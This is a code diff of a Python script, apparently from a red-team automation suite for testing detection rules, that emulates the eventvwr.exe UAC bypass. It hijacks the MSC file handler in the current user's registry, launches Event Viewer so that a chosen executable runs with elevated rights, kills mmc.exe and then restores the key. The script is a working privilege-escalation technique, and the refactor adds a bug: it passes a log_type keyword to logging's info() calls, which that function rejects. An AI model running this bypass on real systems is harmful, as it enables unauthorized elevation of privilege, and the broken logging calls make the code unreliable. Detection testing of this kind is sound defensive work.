@@ -8,10 +8,12 @@
 # ATT&CK: T1088
 # Description: Modifies the Registry value to change the handler for MSC files, bypassing UAC.
 
-import sys
+import logging
 import time
 
-from . import _common, RuleMetadata, register_code_rta, OSType
+from . import OSType, RuleMetadata, _common, register_code_rta
+
+log = logging.getLogger(__name__)
 
 
 @register_code_rta(
@@ -29,22 +31,22 @@ from . import _common, RuleMetadata, register_code_rta, OSType
 # %SystemRoot%\system32\mmc.exe "%1" %*
 
 
-def main(target_file=_common.get_path("bin", "myapp.exe")):
+def main(target_file=_common.get_resource_path("bin/myapp.exe")):
     winreg = _common.get_winreg()
-    _common.log("Bypass UAC with %s" % target_file)
+    log.info("Bypass UAC with %s" % target_file)
 
-    _common.log("Writing registry key")
+    log.info("Writing registry key")
     hkey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\MSCFile\\shell\\open\\command")
     winreg.SetValue(hkey, "", winreg.REG_SZ, target_file)
 
-    _common.log("Running event viewer")
-    _common.execute(["c:\\windows\\system32\\eventvwr.exe"])
+    log.info("Running event viewer")
+    _ = _common.execute_command(["c:\\windows\\system32\\eventvwr.exe"])
 
     time.sleep(3)
-    _common.log("Killing MMC", log_type="!")
-    _common.execute(["taskkill", "/f", "/im", "mmc.exe"])
+    log.info("Killing MMC", log_type="!")
+    _ = _common.execute_command(["taskkill", "/f", "/im", "mmc.exe"])
 
-    _common.log("Restoring registry key", log_type="-")
+    log.info("Restoring registry key", log_type="-")
     winreg.DeleteValue(hkey, "")
     winreg.DeleteKey(hkey, "")
     winreg.CloseKey(hkey)
